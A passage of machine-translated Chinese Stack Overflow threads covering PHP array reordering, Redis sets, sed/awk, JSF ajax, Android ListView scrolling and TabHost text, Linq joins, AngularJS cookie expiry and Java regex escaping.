print_r($a); 
```

输出：

```
Array
(
    [0] => 0
    [1] => 1
    [2] => 2
    [3] => 3
    [4] => 4
    [5] => 5
)
1 ->  4Array
(
    [0] => 0
    [1] => 2
    [2] => 3
    [3] => 4
    [4] => 1
    [5] => 5
)
5 ->  0Array
(
    [0] => 5
    [1] => 0
    [2] => 2
    [3] => 3
    [4] => 4
    [5] => 1
) 
```

您需要添加一些异常处理才能获得完整的代码。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-27T15:08:50.967

看看[这个](https://stackoverflow.com/questions/4126502/move-value-in-php-array-to-the-beginning-of-the-array)描述类似问题的线程。提供以下解决方案：

```
/**
 * Move array element by index.  Only works with zero-based,
 * contiguously-indexed arrays
 *
 * @param array $array
 * @param integer $from Use NULL when you want to move the last element
 * @param integer $to   New index for moved element. Use NULL to push
 * 
 * @throws Exception
 * 
 * @return array Newly re-ordered array
 */
function moveValueByIndex( array $array, $from=null, $to=null )
{
  if ( null === $from )
  {
    $from = count( $array ) - 1;
  }

  if ( !isset( $array[$from] ) )
  {
    throw new Exception( "Offset $from does not exist" );
  }

  if ( array_keys( $array ) != range( 0, count( $array ) - 1 ) )
  {
    throw new Exception( "Invalid array keys" );
  }

  $value = $array[$from];
  unset( $array[$from] );

  if ( null === $to )
  {
    array_push( $array, $value );
  } else {
    $tail = array_splice( $array, $to );
    array_push( $array, $value );
    $array = array_merge( $array, $tail );
  }

  return $array;
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-04-11T12:48:25.730

保留键的函数：

```
function moveElementInArray($array, $toMove, $targetIndex) {
    if (is_int($toMove)) {
        $tmp = array_splice($array, $toMove, 1);
        array_splice($array, $targetIndex, 0, $tmp);
        $output = $array;
    }
    elseif (is_string($toMove)) {
        $indexToMove = array_search($toMove, array_keys($array));
        $itemToMove = $array[$toMove];
        array_splice($array, $indexToMove, 1);
        $i = 0;
        $output = Array();
        foreach($array as $key => $item) {
            if ($i == $targetIndex) {
                $output[$toMove] = $itemToMove;
            }
            $output[$key] = $item;
            $i++;
        }
    }
    return $output;
}

$arr1 = Array('a', 'b', 'c', 'd', 'e');
$arr2 = Array('A' => 'a', 'B' => 'b', 'C' => 'c', 'D' => 'd', 'E' => 'e');

print_r(moveElementInArray($arr1, 3, 1));
print_r(moveElementInArray($arr2, 'D', 1)); 
```

输出：

```
Array
(
    [0] => a
    [1] => d
    [2] => b
    [3] => c
    [4] => e
)
Array
(
    [A] => a
    [D] => d
    [B] => b
    [C] => c
    [E] => e
) 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-03-17T23:52:41.893

可能是我错了，但只是制作数组的副本然后替换值不应该更容易吗？

```
function swap($input, $a, $b){
  $output = $input;
  $output[$a] = $input[$b];
  $output[$b] = $input[$a];
  return $output;
}

$array = ['a', 'c', 'b'];
$array = swap($array, 1, 2); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-03-24T14:57:01.353

根据[之前的回答](https://stackoverflow.com/a/12624423/11607574)。如果您需要保存关联数组的键索引，可以是任何数字或字符串：

```
function custom_splice(&$ar, $a, $b){
    $out = array_splice($ar, $a, 1);
    array_splice($ar, $b, 0, $out);
}

function moveElement(&$array, $a, $b) {
    $keys = array_keys($array);

    custom_splice($array, $a, $b);
    custom_splice($keys, $a, $b); 

    $array = array_combine($keys,$array);
} 
```

```
$s = '{ 
"21": "b", 
"2": "2", 
"3": "3", 
"4": "4", 
"6": "5", 
"7": "6" 
}';
$e = json_decode($s,true);

moveElement($e, 2, 0); 

print_r($e);

Array
(
    [3] => 3
    [21] => b
    [2] => 2
    [4] => 4
    [6] => 5
    [7] => 6
) 
```

**[演示](https://3v4l.org/cntbB)**

`A previous answer`破坏数字索引 - 使它们从`0`.

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2012-09-27T14:59:29.357

您需要创建一个辅助变量。

```
moveElement($a, $i,$j)
  {
  $k=$a[$i];
  $a[$i]=$a[$j];
  $a[$j]=$k;
  return $a;
  } 
```

# redis - SUNION 错误的结果顺序

> ID：12624154
> 
> 赞同：0
> 
> 时间：2012-09-27T14:50:10.733
> 
> 标签：redis

我有两组“set1”和“set2”，只想将“set2”中的元素（“set1”中没有出现）附加到“set1”我想使用redis的SUNIUON，但它以非常奇怪的顺序返回元素

```
redis> SADD key1 "a"
(integer) 1
redis> SADD key1 "b"
(integer) 1
redis> SADD key1 "c"
(integer) 1
redis> SADD key2 "c"
(integer) 1
redis> SADD key2 "d"
(integer) 1
redis> SADD key2 "e"
(integer) 1
redis> SUNION key1 key2
1) "b"
2) "c"
3) "d"
4) "a"
5) "e"
redis> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T16:39:03.460

这是正常的，因为*Redis 集是字符串的**无序***集合：请参阅[官方文档](http://redis.io/topics/data-types)。

# sed - 将匹配的行复制到第二个文件

> ID：12624155
> 
> 赞同：4
> 
> 时间：2012-09-27T14:50:12.530
> 
> 标签：sed, awk

我需要将文件中与模式匹配的所有行复制到第二个文件。

详细说明：我有一个 sql 转储并想创建第二个 sql 文件，其中包括名称与 dx_postings、dx_postings_archive 等名称匹配的表的所有命令。模式应该是 dx_postings。

有任何想法吗？我更喜欢 awk 或 sed 解决方案。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-27T14:54:06.920

`sed`解决方案：

```
sed -ne '/pattern/ p' infile >outfile 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-27T14:51:25.367

好的，看到这个：

```
awk '/pattern/' FILE > NEWFILE 
```

更详细 ：

```
awk '/^(DROP|LOCK) .*dx_postings/' file.sql > newfile.sql 
```

如果您有**INSERT**或**CREATE**语句，这会更加棘手，因为有不止一行。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-27T20:50:50.933

这可能对你有用（GNU sed）；

```
sed -n '/pattern/w second_file' first_file 
```

# java - 如何防止点击页面刷新

> ID：12624159
> 
> 赞同：3
> 
> 时间：2012-09-27T14:50:21.257
> 
> 标签：java, html, ajax, jsf, page-refresh

当用户在我的应用程序中单击时，我试图阻止页面刷新`<h:commandLink>`。我试过这个但它不起作用：

**更新 ：**

```
 <h:dataTable value="#{person.IssueList}" var="p" >
    <h:column style="width: 20px">
        <f:facet name="header">Issue</f:facet>
        <h:commandLink value="#{p.IssueDesc}"/>
    </h:column>

    <h:column style="width: 20px">
         <f:facet name="header">Reporting Date</f:facet>
         <p:calendar  value="#{p.issuerepDt}" rendered="#{p.editable}"                 id="CalendarId"/>                
         <h:outputText value="#{p.issuerepDt}" rendered="#{not p.editable}" />
    </h:column>

    <h:column>
            <f:facet name="header">Action</f:facet>
        <h:commandLink  value="Edit" action="#{person.editAction(p)}">
            <f:ajax execute="@form" render="@none" />          
        </h:commandLink>    

            </h:column>
    </h:dataTable> 
```

爪哇片段：

```
public void  editAction(PersonIssues pIssues) {
    pIssues.setEditable(true);
} 
```

我正在使用从 MKyong.I[编辑 jsf数据表的概念](http://www.mkyong.com/jsf2/how-to-update-row-in-jsf-datatable/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T14:59:25.530

我会尝试使用`listener`of`f:ajax`而不是`action`of `h:commandLink`：

```
<h:commandLink value="Edit">
    <f:ajax listener="#{person.editAction(p)}" execute="@form" render="dataTableId calendarId" />          
</h:commandLink> 
```

另外，请注意您要在 ajax 之后呈现的内容。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T16:52:32.213

由于我看到您将 primefaces 用于日历组件，因此您可能还想使用 primefaces 命令按钮和数据表。primefaces 组件一起玩得很好。

从下面的示例中，您可以看到我为您的数据表提供了一个 ID，并且在 commandLink 上，我添加了一个更新属性以在调用操作后更新数据表。默认情况下，primefaces 有一个在 commandLinks 上设置为 true 的 ajax 属性。

```
<p:dataTable id="myTable" value="#{person.IssueList}" var="p" >
    <p:column style="width: 20px" headerText="Issue">
         <p:commandLink value="#{p.IssueDesc}"/>
    </p:column>

    <p:column style="width: 20px" headerText="Reporting Date">
         <p:calendar  value="#{p.issuerepDt}" rendered="#{p.editable}"                 id="CalendarId"/>                
         <h:outputText value="#{p.issuerepDt}" rendered="#{not p.editable}" />
    </p:column>

    <p:column headerText="Action">
         <p:commandLink  value="Edit" action="#{person.editAction(p)}" update="myTable"/>
    </p:column>
</p:dataTable> 
```

# command-line - vb 脚本通过将列表与可能的所有者进行比较来检查文件所有者

> ID：12624161
> 
> 赞同：0
> 
> 时间：2012-09-27T14:50:23.913
> 
> 标签：command-line, vbscript, command-prompt

我在脚本方面很差/新，我没有找到任何执行以下操作的脚本：

1.  我有一个“allowed.txt”文件，其中包含允许更改/修改文件的人员的姓名。IE

    ```
    administrator
    computername\UsernameA
    computername\UsernameB 
    ```

2.  现在我希望有一个脚本可以读取这个文本文件并将机器上的所有文件所有者（更改者）与这个列表中的名称进行比较。由计算机名\用户名C（未在我的允许用户列表中列出）更改的所有文件应在具有“文件路径\文件名”的“output.txt”文件中进行解析 - 由“计算机名\用户名C - 更改日期”更改

问题如下：我们有人在电脑上工作，他们在电脑上工作时操作文件。手动检查每个文件以查找被无权更改的文件的工作量太大。

因此，如果我运行此脚本并找到所有由未在我的文本文件中列出的人更改的文件，那将是一个很大的帮助。

我们*不想*使用 Windows 文件审核。

是否有机会获取/编写可以实现此目的的 vbs 脚本？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T17:34:53.823

不，如果没有 SACL（即文件/文件夹审计），这是无法实现的，因为访问/更改特定文件的信息*不会*以其他方式存储。

# ssl - 无法建立信任关系 wso2 ESB

> ID：12624162
> 
> 赞同：0
> 
> 时间：2012-09-27T14:50:25.593
> 
> 标签：ssl, wso2, esb, wso2esb

你好我正在通过http使用代理，所以当我看到这个错误时我很惊讶：

无法建立信任关系

```
System.Net.WebException: The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel. ---> System.Security.Authentication.AuthenticationException: The remote certificate is invalid according to the validation procedure.
   at System.Net.Security.SslState.StartSendAuthResetSignal(ProtocolToken message, AsyncProtocolRequest asyncRequest, Exception exception)... 
```

对于 ASP.NET Web 应用程序：

```
 Example1 es = new Example1();
            try
            {
                int result = es.checkUserExists("bob");
                TextBox1.Text = result.ToString();
            }
            catch (Exception ex) {
                TextBox1.Text = ex.ToString();
            } 
```

我的代理如下：

```
<proxy xmlns="http://ws.apache.org/ns/synapse" name="Example1" transports="https,http" statistics="disable" trace="disable" startOnLoad="true">
   <target>
      <inSequence>
         <property name="STATUS" value="asking_id" scope="default" type="STRING"/>
         <log level="full">
            <property name="insequence****" value="This is the in sequence"/>
            <property xmlns:ns2="http://chi/" name="property_arg0" expression="//ns2:checkUserExists/arg0"/>
         </log>
         <send>
            <endpoint>
               <address uri="http://192.168.10.176:8080/Example1/UserExist/"/>
            </endpoint>
         </send>
      </inSequence>
      <outSequence>
         <switch source="get-property('STATUS')">
            <case regex="asking_id">
               <log level="full">
                  <property name="sequence*******" value="outSequence - STATE 01 - asking for balance"/>
                  <property xmlns:ns2="http://chi/" name="property_result******" expression="//ns2:checkUserExistsResponse/return"/>
                  <property name="status********" expression="get-property('STATUS')"/>
               </log>
               <property xmlns:ns2="http://chi/" name="id_result" expression="//ns2:checkUserExistsResponse/return" scope="default" type="STRING"/>
               <enrich>
                  <source type="inline" clone="true">
                     <ns2:getBalancebyID xmlns:ns2="http://chi/">                        
                        <arg0 xmlns="">?</arg0>                     
                     </ns2:getBalancebyID>
                  </source>
                  <target type="body"/>
               </enrich>
               <enrich>
                  <source type="property" clone="true" property="id_result"/>
                  <target xmlns:ns2="http://chi/" xpath="//ns2:getBalancebyID/arg0"/>
               </enrich>
               <property name="STATUS" value="response" scope="default" type="STRING"/>
               <send>
                  <endpoint>
                     <address uri="http://192.168.10.176:8080/Example1/UserBalance"/>
                  </endpoint>
               </send>
            </case>
            <case regex="response">
               <log level="full">
                  <property name="sequence*******" value="outSequence - STATE 02 - returning balance"/>
               </log>
               <send/>
            </case>
         </switch>
      </outSequence>
   </target>
   <publishWSDL key="conf:/UserExist.xml"/>
   <description></description>
</proxy> 
```

有什么建议为什么我不能使用代理？

感谢您的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T16:42:47.340

这与.Net App..有关此问题的可用资源数量很多

例如： http: [//support.microsoft.com/kb/823177](http://support.microsoft.com/kb/823177)

# javascript - OOP Javascript 父对象方法或对象？

> ID：12624173
> 
> 赞同：4
> 
> 时间：2012-09-27T14:51:09.093
> 
> 标签：javascript

```
var O = {

    elements: {

        main: function() { return jQuery("#main"); },
        footer: function() { return jQuery("#footer"); }
    },

    main: function(html) {

        return (this.elements.main());
    },

    style: {

        setMaincolor: function() {

            // TypeError: Cannot call method 'main' of undefined
            return (this.elements.main());

        }

    }    

}; 
```

所以; 我是 O.style 对象的父母对象？？？？

```
O.style.setMaincolor() // TypeError: Cannot call method 'main' of undefined
O.main() // [<div id=​"main">​&lt;/div>​] 
```

setMaincolor 方法将此返回给 O 对象

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T14:56:21.247

`this`指调用方法的对象。

`main()``O`在对象上调用，对.`this`的引用也是如此`O`。因此`this.elements === O.elements`。

`setMaincolor()`在`style`对象上调用，因此`this`将是对 的引用`O.style`，它没有`.elements`属性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T15:00:30.353

你必须明确定义`this`应该是什么意思；如果未指定，`this`将指向最近的对象。

你可以像这样为它创建一个闭包：

```
var O = (function() {
    var self = {
        elements: {
            main: function() { return jQuery("#main"); },
            footer: function() { return jQuery("#footer"); }
        }
    }

    self.style = {
        setMaincolor: function() {
            return self.elements.main();
        }
    }

    return self;
}()); 
```

`(function() { ... }());`返回对象，并且是一个只有对象知道的`self`“私有”变量，`O`它指向自身，从而使`.elements.main()`引用工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-27T15:11:13.040

由于`setMaincolor`方法是在`style`对象内部定义的，所以`this`是指`style`对象。由于`style`对象没有`elements`属性，`this.elements`所以是未定义的。

一种解决方案是这样的，您`O`明确命名对象而不是使用`this`：

```
var O = {

    elements: {

        main: function() { return jQuery("#main"); },
        footer: function() { return jQuery("#footer"); }
    },

    main: function(html) {

        return (this.elements.main());
    },

    style: {

        setMaincolor: function() {

            // TypeError: Cannot call method 'main' of undefined
            return (O.elements.main());

        }

    }    

}; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-27T15:10:12.537

你不能`this.elements`在你的`setMaincolor`方法中引用。`this`-pointer 指的是您的样式对象：改为`O.elements.main()`在您的`O.style.setMaincolor`函数中使用。

```
style: {
    setMaincolor: function() {
        return (O.elements.main());

    }
} 
```

虽然，我不推荐这种方法，但请注意，您也可以使用：`O.style.setMaincolor.call(O,[]);`which make `this`reference `O`。

这就是我将如何解决它：

```
var O = (function() {
   var self = {
       elements: {
           main: function() { return jQuery("#main"); },
           footer: function() { return jQuery("#footer"); }
       },

       main: function(html) {
           return self.elements.main();
       },

       style: {
           setMaincolor: function() {
               return self.elements.main();
           }
       }
   };    

   return self;    
}()); 
```

# android - android获取填充了不同高度的listview的滚动位置

> ID：12624174
> 
> 赞同：1
> 
> 时间：2012-09-27T14:51:08.867
> 
> 标签：android, listview, android-listview

在 android 中，如何获取列表视图的滚动位置？

我知道我可以使用以下代码检索统一填充列表视图的滚动位置：

```
int scrollY = -this.getChildAt(0).getTop() + this.getFirstVisiblePosition()* this.getChildAt(0).getHeight(); 
```

代码假定列表视图中所有子项（项目）的高度都相等（`this.getChildAt(0).getHeight()`）

现在，如果我用大小不等的项目填充我的列表视图，我如何获得正确的滚动位置？

我的列表视图看起来像这样： ![在此处输入图像描述](../Images/bce8a822a0bc84fe1c6d941f96d43985.png)

这就是为什么我需要滚动位置：

```
private Canvas drawIndicator(Canvas canvas) {

    int scrollY = getCurrentScrollPosition();

    paint.setColor(Color.GRAY);
    paint.setAlpha(100);
    canvas.drawRect(getLeft(), indicatorPosition[0] - scrollY, getRight(), indicatorPosition[1]
            - scrollY, paint);

     //Log.d(VIEW_LOG_TAG, "drawIndicator:" + (indicatorPosition[1] -
     //scrollY));

    paint.setColor(Color.parseColor("#47B3EA"));
    canvas.drawRect(getLeft(), indicatorPosition[1] - scrollY - (indicatorHeight / 2),
            getRight(), indicatorPosition[1] - scrollY + indicatorHeight, paint);

    return canvas;
} 
```

我需要绘制一个跟随列表视图滚动的指示器

我会像这样调用它

```
@Override
protected void onDraw(Canvas canvas) {
    canvas.save();
    canvas = drawIndicator(canvas);
    super.onDraw(canvas);
    canvas.restore();
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T16:09:47.050

假设您知道 All your items type 的大小：

```
int currentY = 0;
        for (int i = 0; i < listView.getFirstVisiblePosition(); i++) {

            int type = listView.getAdapter().getItemViewType(i);
            currentY += getHightForViewType(type);
        }

        int scrollY = -listView.getChildAt(0).getTop() + currentY; 
```

并使用您的适配器：

```
 private int getHightForViewType(int itemViewType) {

        int hightItem;
        switch (itemViewType) {
            case 0:
                hightItem = 100;
                break;

            default:
                hightItem = 60;
                break;
        }
        return hightItem;

    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-08-16T09:47:59.180

或者：

```
private Dictionary<Integer, Integer> listViewItemHeights = new Hashtable<Integer, Integer>();

private int getScroll() {
    View c = listView.getChildAt(0); //this is the first visible row
    int scrollY = -c.getTop();
    listViewItemHeights.put(listView.getFirstVisiblePosition(), c.getHeight());
    for (int i = 0; i < listView.getFirstVisiblePosition(); ++i) {
        if (listViewItemHeights.get(i) != null) // (this is a sanity check)
            scrollY += listViewItemHeights.get(i); //add all heights of the views that are gone
    }
    return scrollY;
} 
```

这应该在以下位置调用：

```
public void onScroll(AbsHListView view, int firstVisibleItem, int visibleItemCount, int totalItemCount) 
```

仅当手动从位置 0 滚动时才有效，而不是以编程方式。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-07-12T11:14:06.333

我遇到了同样的问题，但是我在每个项目中使用了带有随机长度文本的 listView，因此我事先不知道项目高度。我的实现：

```
private static int[] heights;

public static int getScrollY(ListView lv) {
  if (heights == null || lv.getCount() != heights.length) {
        heights = new int[lv.getCount()];
    }
    View c = lv.getChildAt(0);
    if (c == null) {
        return 0;
    }

    int firstVisiblePosition = lv.getFirstVisiblePosition();
    if (firstVisiblePosition < lv.getCount() && heights[firstVisiblePosition + 1] == 0) {
        heights[firstVisiblePosition + 1] += heights[firstVisiblePosition] + c.getHeight();
    }
    return -c.getTop() + heights[firstVisiblePosition];
} 
```

我认为如果 listView 的任何元素发生更改（添加/删除/更改高度），就会出现问题。滚动 listView 时也会计算高度，如果以编程方式滚动 listView 则会出现问题。这很可悲，listView 实现阻止了轻松访问滚动 Y 位置:(

# android - 更改 tabHost 上的文本大小

> ID：12624175
> 
> 赞同：5
> 
> 时间：2012-09-27T14:51:11.513
> 
> 标签：android, android-style-tabhost

我正在尝试用 2 个选项卡做一个 tabHost，没关系，但是我想更改文本大小，我搜索了很多，但是如果不更改选项卡的所有布局，我找不到任何东西，我只想更改文本大小，而不是更改背景或类似的东西，我添加我的标签是这样的：

```
tabHost.addTab(tabHost.newTabSpec("photos_tab").setIndicator(getString(R.string.userPhotos)).setContent(R.id.tab2)); 
```

当我尝试将 TextView 放入 setIndicator 中时，我可以更改文本大小，但可以更改所有内容、单击、背景和其他内容。所以我只想更改文本大小。

有任何想法吗？

ps：我没有扩展 TabActivity，所以我不能在 AndroidManifest 或类似的东西中更改 Theme。（我之前试过：[How to change the font size of tabhost in android](https://stackoverflow.com/questions/5788971/how-to-change-the-font-size-of-tabhost-in-android)）

谢谢。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-09-27T15:06:53.490

是的，您可以通过将孩子放在指定位置并获取它的 textview 并设置它的 textsize 来做到这一点。

```
 TextView x = (TextView) tabHost.getTabWidget().getChildAt(0).findViewById(android.R.id.title);
    x.setTextSize(25); 
```

# vb.net - 如何调试 Linq - Join 方法永远不会到达 ResultSelector

> ID：12624180
> 
> 赞同：0
> 
> 时间：2012-09-27T14:51:17.027
> 
> 标签：vb.net, linq

好的，我要做的是从它们各自的数据库中获取两个数据集，并使用由 Join 扩展方法形成的 Linq 查询将它们连接起来。Linq 查询之前确实有效，但经过一些重构（在代码的其他部分）后它不再有效。我真的看不出有什么区别。

我已经扩展了 KeySelector 和 ResultSelector 以便能够在其中放置断点。这两个可枚举（localSeq 和 remoteSeq）工作正常，它们得到了正确数量的元素等。两个序列的元素都被格式化为 Object()。KeySelectors（由 CompositeJoinKeySelector 函数实现）似乎也可以工作。这个函数应该做的是从每个元素中选择正确的字段，以便 .Join 方法知道如何检查是否相等。似乎是这一步（检查是否相等）失败了。

当我单步执行代码时，linq 查询会遍历两个数据集并执行 KeySelector。这似乎返回了预期的值。但是，之后它不会在 ResultSelector 中中断。在我看来，这意味着它永远不会处理结果，因为他没有找到匹配的“行”。这很奇怪，因为我逐步执行，两个 KeySelector 返回一个二维 Object 数组，并且肯定存在匹配的条目。

有没有办法看到这个（大概）嵌套循环过程并查看相等比较失败的地方？

```
 Dim LocalSeq As IEnumerable(Of Object()) = From locRow As Object() In LocalArray
        Dim RemoteSeq As IEnumerable(Of Object()) = From remRow As Object() In RemoteArray

        Dim joinSeq As IEnumerable(Of Object()) = LocalSeq.Join(Of Object(), Object, Object())(RemoteSeq, _
                                                                                               Function(locRow As Object())
                                                                                                   Dim locRes As Object() = CompositeJoinKeySelector(locRow, LocalKeyList)
                                                                                                   Return locRes
                                                                                               End Function, _
                                                                                               Function(remRow As Object())
                                                                                                   Dim remRes As Object() = CompositeJoinKeySelector(remRow, RemoteKeyList)
                                                                                                   Return remRes
                                                                                               End Function, _
                                                                                               Function(locRow As Object(), remRow As Object())
                                                                                                   Dim joinRes As Object() = JoinRowArrays(locRow, remRow, FinalJoinSelectColumnList)
                                                                                                   Return joinRes
                                                                                               End Function)

        Return joinSeq.ToArray() 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-03T11:16:45.943

好的，似乎比较失败了，因为默认情况下使用了参考比较。所以，我通过实现 IEqualityComparer 解决了这个问题。

# javascript - 如何在 AngularJS 中设置 cookie 的过期日期

> ID：12624181
> 
> 赞同：81
> 
> 时间：2012-09-27T14:51:20.950
> 
> 标签：javascript, cookies, angularjs, session-cookies, angular-cookies

1.  我们希望将用户的授权信息存储在 cookie 中，该信息在浏览器刷新 (F5) 时不应丢失。

2.  如果用户在登录时选择了“记住我”复选框，我们希望将授权信息存储在“永久 cookie”中。

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2015-03-13T13:20:09.537

这在 Angular 的 1.4.0 版本中使用`ngCookies`模块是可能的：

[https://docs.angularjs.org/api/ngCookies/service/$cookies](https://docs.angularjs.org/api/ngCookies/service/$cookies)

```
angular.module('cookiesExample', ['ngCookies'])
.controller('ExampleController', ['$cookies', function($cookies) {
  // Find tomorrow's date.
  var expireDate = new Date();
  expireDate.setDate(expireDate.getDate() + 1);
  // Setting a cookie
  $cookies.put('myFavorite', 'oatmeal', {'expires': expireDate});
}]); 
```

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2013-12-14T02:56:17.900

对于 1.4：正如这里的评论和下面的其他评论所述，从 1.4 开始，Angular 的原生 cookie 支持现在提供了编辑 cookie 的能力：

> 由于 38fbe3ee，$cookies 将不再公开代表当前浏览器 cookie 值的属性。$cookies 不再轮询浏览器以获取对 cookie 的更改，也不再将 cookie 值复制到 $cookies 对象上。
> 
> 这已更改，因为轮询很昂贵，并且导致 $cookies 属性无法与实际浏览器 cookie 值正确同步的问题（最初添加轮询的原因是允许不同选项卡之间的通信，但今天有更好的方法来做到这一点，例如本地存储。）
> 
> $cookies 上的新 API 如下：
> 
> get put getObject putObject getAll remove 您必须明确使用上述方法才能访问 cookie 数据。这也意味着您无法再通过查看 $cookies 上的属性来检测浏览器 cookie 上发生的变化。
> 
> 此功能通常仅在第 3 方库在运行时以编程方式更改 cookie 时才需要。如果您依赖于此，那么您必须编写可以对 3rd 方库做出反应的代码，从而对 cookie 进行更改，或者实现您自己的轮询机制。

实际实现是通过[$cookiesProvider](https://docs.angularjs.org/api/ngCookies/provider/$cookiesProvider#defaults)对象完成的，该对象可以通过[`put`](https://docs.angularjs.org/api/ngCookies/service/$cookies#put)调用传递。

对于 1.3 及以下版本：对于那些尽力避免加载 jQuery 插件的人来说，这似乎是 angular 的一个很好的替代品 - [https://github.com/ivpusic/angular-cookie](https://github.com/ivpusic/angular-cookie)

* * *

## 回答 #3

> 赞同：28
> 
> 时间：2015-03-04T12:44:31.927

在 Angular v1.4 中，您**终于**可以为 cookie 设置一些选项，例如过期时间。这是一个非常简单的例子：

```
var now = new Date(),
    // this will set the expiration to 12 months
    exp = new Date(now.getFullYear()+1, now.getMonth(), now.getDate());

$cookies.put('someToken','blabla',{
  expires: exp
});

var cookie = $cookies.get('someToken');
console.log(cookie); // logs 'blabla' 
```

如果您在运行此代码后检查 cookie，您将看到过期将正确设置为名为`someToken`.

作为第三个参数传递给上述函数的对象也允许其他选项，`put`例如设置`path`和。检查[文档](https://docs.angularjs.org/api/ngCookies/provider/$cookiesProvider#defaults)以获取概述。`domain``secure`

**PS** - 作为旁注，如果您正在升级`$cookieStore`已弃用的思维，那么`$cookies`现在是处理 cookie 的唯一方法。见[文档](https://docs.angularjs.org/api/ngCookies/service/$cookieStore)

* * *

## 回答 #4

> 赞同：16
> 
> 时间：2016-09-09T11:08:45.170

我想举一个额外的例子，因为有些人知道 cookie 生命周期的额外持续时间。IE。他们希望将 cookie 设置为再持续 10 分钟或 1 天。

通常你已经知道 cookie 在几秒钟内会持续多久。

```
 var today = new Date();
    var expiresValue = new Date(today);

    //Set 'expires' option in 1 minute
    expiresValue.setMinutes(today.getMinutes() + 1); 

    //Set 'expires' option in 2 hours
    expiresValue.setMinutes(today.getMinutes() + 120); 

    //Set 'expires' option in (60 x 60) seconds = 1 hour
    expiresValue.setSeconds(today.getSeconds() + 3600); 

    //Set 'expires' option in (12 x 60 x 60) = 43200 seconds = 12 hours
    expiresValue.setSeconds(today.getSeconds() + 43200); 

    $cookies.putObject('myCookiesName', 'myCookiesValue',  {'expires' : expiresValue}); 
```

你可以像往常一样检索它：

```
 var myCookiesValue = $cookies.getObject('myCookiesName'); 
```

如果为空，则返回未定义。

链接;

[http://www.w3schools.com/jsref/jsref_obj_date.asp](http://www.w3schools.com/jsref/jsref_obj_date.asp)
[https://docs.angularjs.org/api/ngCookies/provider/](https://docs.angularjs.org/api/ngCookies/provider/) $cookiesProvider#defaults

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2014-09-07T12:45:14.753

您可以转到 angular.js 脚本并更改插入 cookie
搜索，`self.cookies = function(name, value) {` 然后您可以更改添加 cookie 的代码，例如 7 天

```
 if (value === undefined) {
    rawDocument.cookie = escape(name) + "=;path=" + cookiePath +
                            ";expires=Thu, 01 Jan 1970 00:00:00 GMT";
  } else {
    if (isString(value)) {
        var now = new Date();
        var time = now.getTime();
        time += 24*60*60*1000*7;
        now.setTime(time);
         cookieLength = (rawDocument.cookie = escape(name) + '=' + escape(value) +
                 ';path=' + cookiePath+";expires="+now.toGMTString()).length + 1 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2015-02-05T22:56:27.570

我知道这个问题有点老了，并且已经有了一个公认的答案。

但仍然是我正在努力解决的一个当前问题（与 jQuery 或纯 Javascript 无关）。

所以，经过一些研究，我发现了这个： [https ://github.com/ivpusic/angular-cookie](https://github.com/ivpusic/angular-cookie)

它提供了一个与 $cookieStore 非常相似的“界面”。并允许配置到期日期（值和单位）。

关于 $cookie 或 $cookieStore 的到期日期的角度原生支持，“他们”承诺在 1.4 上对此主题进行更新，请查看：[https ://github.com/angular/angular.js/pull/10530](https://github.com/angular/angular.js/pull/10530)

可以使用 $cookieStore.put(...) 设置到期日期，至少他们建议...

**编辑：**我遇到了一个“问题”，你不能将 $cookies 与 angular-cookie 模块化混合。因此，如果您设置一个 cookie 并使用`ipCookie(...)`检索它，`ipCookie(...)`因为使用 $cookie 它将返回`undefined`。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-09-20T16:19:01.787

正如@vincent-briglia[指出](https://github.com/angular/angular.js/issues/4069)的那样，有一个 jQuery 插件可以用作解决方法，直到`$cookie`服务变得可配置 -[在这里查看](https://github.com/angular/angular.js/pull/2459#issuecomment-24657403)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-11-06T16:01:23.530

您可以使用[https://github.com/ivpusic/angular-cookie](https://github.com/ivpusic/angular-cookie)

首先，您需要将 ipCookie 注入您的 Angular 模块。

```
var myApp = angular.module('myApp', ['ipCookie']); 
```

现在，例如，如果您想从控制器中使用它

```
myApp.controller('cookieController', ['$scope', 'ipCookie', function($scope, ipCookie) {
  // your code here
}]); 
```

创建 cookie 使用

```
ipCookie(key, value); 
```

该值支持字符串、数字、布尔值、数组和对象，并将自动序列化到 cookie 中。

您还可以设置一些其他选项，例如 cookie 过期的天数

```
ipCookie(key, value, { expires: 21 }); 
```

# java - 在java中进行正则表达式时转义'{'？

> ID：12624187
> 
> 赞同：3
> 
> 时间：2012-09-27T14:51:48.987
> 
> 标签：java, regex, bufferedreader

我试图让我的代码忽略它正在阅读的一些行。因此，我的 SSCE 是：

```
public class testRegex {
    private static final String DELETE_REGEX = "\\{\"delete"; //escape the '{', escape the ' " '
    private static final String JSON_FILE_NAME = "example";
public static void main(String[] args){
    String line = null;
    try{
        BufferedReader buff = new BufferedReader (new FileReader(JSON_FILE_NAME + ".json"));
        line = buff.readLine        buff.close();
